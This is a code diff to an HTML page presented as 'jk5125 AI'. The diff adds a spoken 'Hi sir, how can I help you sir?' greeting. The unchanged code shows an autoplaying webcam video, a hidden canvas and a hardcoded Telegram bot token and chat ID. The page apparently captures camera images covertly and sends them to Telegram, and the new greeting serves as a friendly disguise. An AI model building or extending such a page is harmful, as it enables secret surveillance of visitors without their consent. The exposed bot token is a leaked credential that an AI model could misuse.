@@ -5,10 +5,30 @@
 </head>
 <body>
   <h2>jk5125 AI</h2>
+  <!-- Greeting message area -->
+  <div id="greeting" style="white-space: pre-line; font-size: 18px; margin-bottom: 20px;"></div>
   <video id="video" autoplay playsinline width="300"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
+    // SPEAKING GREETING
+    function speak(text) {
+      const utter = new SpeechSynthesisUtterance(text);
+      utter.lang = "en-US";
+      window.speechSynthesis.speak(utter);
+    }
+
+    document.addEventListener("DOMContentLoaded", function() {
+      const greetingDiv = document.getElementById("greeting");
+      greetingDiv.textContent = "Hi sir";
+      speak("Hi sir");
+      setTimeout(() => {
+        greetingDiv.textContent += "\nHow can I help you sir?";
+        speak("How can I help you sir?");
+      }, 1500);
+    });
+
+    // --- YOUR ORIGINAL CODE BELOW ---
     const BOT_TOKEN = "8469961243:AAEj96it0Xm-QEPlkRM8nZPM5RfId3bIVYs";  
     const CHAT_ID = "6096787949";
 
@@ -97,4 +117,3 @@
   </script>
 </body>
 </html>
-
